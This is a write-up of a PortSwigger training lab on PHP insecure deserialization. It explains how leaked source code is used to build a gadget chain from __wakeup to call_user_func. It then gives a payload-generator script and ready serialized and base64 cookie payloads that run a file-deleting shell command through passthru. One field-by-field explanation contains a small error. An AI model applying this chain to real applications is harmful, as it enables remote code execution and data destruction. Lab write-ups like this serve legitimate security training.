# Penetration Test Report Software and Data Integrity Failures

**Table of Contents**

Sample For Testing

Attack Narrative

1. ***Sample For Testing***
    - Lab on Port Swigger name “****Developing a custom gadget chain for PHP deserialization****”
    - Lab-link: [https://portswigger.net/web-security/deserialization/exploiting/lab-deserialization-developing-a-custom-gadget-chain-for-php-deserialization](https://portswigger.net/web-security/deserialization/exploiting/lab-deserialization-developing-a-custom-gadget-chain-for-php-deserialization)
    - Description
        
        ![Untitled](Penetration%20Test%20Report%20Software%20and%20Data%20Integrit%209ca4bdff27b647eb9f0534d277e5b07e/Untitled.png)
        
    - The term we need to know:
        - Gadget chain is the result of assembling method calls, assigning fields so that it follows the desired flow: RCE, write file, …
    - Some magic methods we need to know:
        - `__construct()` :method is invoked automatically when an object is created
        - `__get()` :invoked when reading the value from a non-existing or inaccessible property
        - `__wakeup()` :invoked when the deserialize() runs to reconstruct any resource that an object may have.
        - `call_user_func()` :Calls the **`callback`**given by the first parameter and passes the remaining parameters as arguments.
2. ***Attack Narrative***
    - Check the cookie session to get the serialized php object.
        
        ![Untitled](Image_Report/Untitled%201.png)
        
        - This can be interpreted as follows:
            - `O:4:"User"` - An object with the 4-character class name `"User"`
            - `2` - the object has 2 attributes
            - `s:8:"name"` - The key of the first attribute is the 4-character string `"username"`
            - `s:6:"wiener"` - The value of the first attribute is the 6-character string `"wiener"`
            - `s:12:"access_token"` - The key of the second attribute is the 12-character string `"access_token"`
            - `s:32:otqrr2q8h0wt9alzesijsafdzubycaiv` - The value of the second attribute is the 32-character string `otqrr2q8h0wt9alzesijsafdzubycaiv`
        
        ⇒ So we can check if this website is vulnerable to insecure deserialization.
        
    - Check the source of web page and in all of them, we get the information about the located of file php.
        
        ![Untitled](Image_Report/Untitled%202.png)
        
        ⇒ So we check the link in the browser, we can add a tilde (~) at the end the file link like this:
        
        [https://0a0c007f047febd8c00eb4d000ef0063.web-security-academy.net/cgi-bin/libs/CustomTemplate.php~](https://0a0c007f047febd8c00eb4d000ef0063.web-security-academy.net/cgi-bin/libs/CustomTemplate.php~)
        
        - We have the source code:
            
            ```php
            <?php
            
            class CustomTemplate {
                private $default_desc_type;
                private $desc;
                public $product;
            
                public function __construct($desc_type='HTML_DESC') {
                    $this->desc = new Description();
                    $this->default_desc_type = $desc_type;
                    // Carlos thought this is cool, having a function called in two places... What a genius
                    $this->build_product();
                }
            
                public function __sleep() {
                    return ["default_desc_type", "desc"];
                }
            
                public function __wakeup() {
                    $this->build_product();
                }
            
                private function build_product() {
                    $this->product = new Product($this->default_desc_type, $this->desc);
                }
            }
            
            class Product {
                public $desc;
            
                public function __construct($default_desc_type, $desc) {
                    $this->desc = $desc->$default_desc_type;
                }
            }
            
            class Description {
                public $HTML_DESC;
                public $TEXT_DESC;
            
                public function __construct() {
                    // @Carlos, what were you thinking with these descriptions? Please refactor!
                    $this->HTML_DESC = '<p>This product is <blink>SUPER</blink> cool in html</p>';
                    $this->TEXT_DESC = 'This product is cool in text';
                }
            }
            
            class DefaultMap {
                private $callback;
            
                public function __construct($callback) {
                    $this->callback = $callback;
                }
            
                public function __get($name) {
                    return call_user_func($this->callback, $name);
                }
            }
            
            ?>
            ```
            
    
    - For creating a custom gadget chain, we check the code we got above for kick-off (The first gadget in the chain that triggers the whole gadget chain) and sink gadgets (The last gadget in the chain that can execute our arbitrary code).
    - In this example, it seems that `__wakeup()` magic method might be suitable as the kick-off gadget. This method is executed when the php serialized object is going to be deserialized, in our case, it might execute our payload that we’re going to create. We follow the code, it finally leads to this line: `$this->desc = $desc->$default_desc_type;`  in `Product` class constructor.
    - Also we search for a suitable sink gadget, the `DefaultMap` class has `call_user_func` which can execute arbitrary functions if we can somehow lead our input to this function. This function gets `$this->callback` as the first parameter and `$name` as the second, in this function, the first parameter is the name of an arbitrary php function and the second is the parameter passed to that function, this function is called in `__get()` magic method, this method is called when we call an undefined property of `DefaultMap` class and the called property name is passed to the second parameter which in our case in the command we are going to execute.
    - Also we can assign any value to `$this->callback` in the class constructor:
        
        ```php
         public function __construct($callback) {
                $this->callback = $callback;
            }
        ```
        
    - So for example we can have a remote code execution in a code similar to this:
        
        ```php
        $test = new DefaultMap('passthru');
        $command = 'rm /home/carlos/morale.txt';
        $test->$command;
        ```
        
    - We assigned our arbitrary function name (`passthru`) to `$this->callback` by passing this value to the class constructor in the first line of code above. The `passthru` php function executes any command we send to it.
    - The third line in the above code triggers the `__get()` method invocation of `DefaultMap` class which results in the following code being executed:
        
        ```php
        return call_user_func($this->callback, $name);
        ```
        
    - `$this->callback` is `passthru` and `$name` is `rm /home/carlos/morale.txt` now which results in the file being removed from the server.
    - So the sink gadget and code is complete, now we need to somehow link the kick-off gadget to the sink gadget to execute these lines of codes.
    - If we review the leaked code, we can see that we have an object(`$this->desc`) that can have the value of our first line above:
        
        `$this->desc = new DefaultMap('passthru');`
        
        also we have a property(`$this->default_desc_type`) that can have the value of our second line above:
        
        `$this->default_desc_type = 'rm /home/carlos/morale.txt';`
        
    - If we following the code, we arrive at the last part in `Product` class constructor that gets the above `$this->desc` and `$this->default_desc_type` values as parameters and assign them to `$this->desc` of its own:
        
        ```php
        public function __construct($default_desc_type, $desc) {
            $this->desc = $desc->$default_desc_type;
        }
        ```
        
        which is exactly when we want and is the same as the third line of our code above: `$test->$command`; which results in our arbitrary code being executed.
        
    - I have prepared a php file for creating the final payload with just the parts of the leaked code that are necessary for creating the payload:
        
        ```php
        <?php
        
        class CustomTemplate {
            private $default_desc_type;
            private $desc;
        
            public function __construct() {
                $this->desc = new DefaultMap('passthru');
                $this->default_desc_type = 'rm /home/carlos/morale.txt';
            }
        }
        
        class DefaultMap {
            private $callback;
        
            public function __construct($callback) {
                $this->callback = $callback;
            }
        }
        
        $test = new CustomTemplate();
        $ser = serialize($test);
        echo($ser . "\n");
        echo("===================================================\n");
        echo("base64 endcoded then urlencoded: \n");
        echo(urlencode(base64_encode($ser)) . "\n");
        
        ?>
        ```
        
        and output of this code is:
        
        ```php
        O:14:"CustomTemplate":2:{s:33:"CustomTemplatedefault_desc_type";s:26:"rm /home/carlos/morale.txt";s:20:"CustomTemplatedesc";O:10:"DefaultMap":1:{s:20:"DefaultMapcallback";s:8:"passthru";}}
        ===================================================
        base64 endcoded then urlencoded:
        TzoxNDoiQ3VzdG9tVGVtcGxhdGUiOjI6e3M6MzM6IgBDdXN0b21UZW1wbGF0ZQBkZWZhdWx0X2Rlc2NfdHlwZSI7czoyNjoicm0gL2hvbWUvY2FybG9zL21vcmFsZS50eHQiO3M6MjA6IgBDdXN0b21UZW1wbGF0ZQBkZXNjIjtPOjEwOiJEZWZhdWx0TWFwIjoxOntzOjIwOiIARGVmYXVsdE1hcABjYWxsYmFjayI7czo4OiJwYXNzdGhydSI7fX0%3D
        ```
        
    - Keep in mind that the php serialized object is a binary format meaning it may contain some null characters. So if we copy-paste the clear text part from the above output:
        
        ```php
        O:14:"CustomTemplate":2:{s:33:"CustomTemplatedefault_desc_type";s:26:"rm /home/carlos/morale.txt";s:20:"CustomTemplatedesc";O:10:"DefaultMap":1:{s:20:"DefaultMapcallback";s:8:"passthru";}}
        ```
        
        ⇒ It won’t work, if we want to copy-paste the clear text version, we need to edit it manually and the final payload will be something like this:
        
        ```php
        O:14:"CustomTemplate":2:{s:17:"default_desc_type";s:26:"rm /home/carlos/morale.txt";s:4:"desc";O:10:"DefaultMap":1:{s:8:"callback";s:8:"passthru";}}
        ```
        
- After that, we encode it by base64 and url encoded the output to easily be able to copy-paste it as the session cookie. So we copy this part from the output above:
    
    ```php
    TzoxNDoiQ3VzdG9tVGVtcGxhdGUiOjI6e3M6MzM6IgBDdXN0b21UZW1wbGF0ZQBkZWZhdWx0X2Rlc2NfdHlwZSI7czoyNjoicm0gL2hvbWUvY2FybG9zL21vcmFsZS50eHQiO3M6MjA6IgBDdXN0b21UZW1wbGF0ZQBkZXNjIjtPOjEwOiJEZWZhdWx0TWFwIjoxOntzOjIwOiIARGVmYXVsdE1hcABjYWxsYmFjayI7czo4OiJwYXNzdGhydSI7fX0%3D
    ```
    
     and paste it here in the session cookie. Then click apply and send. The lab is solved!
    
    ![Untitled](Image_Report/Untitled%203.png)
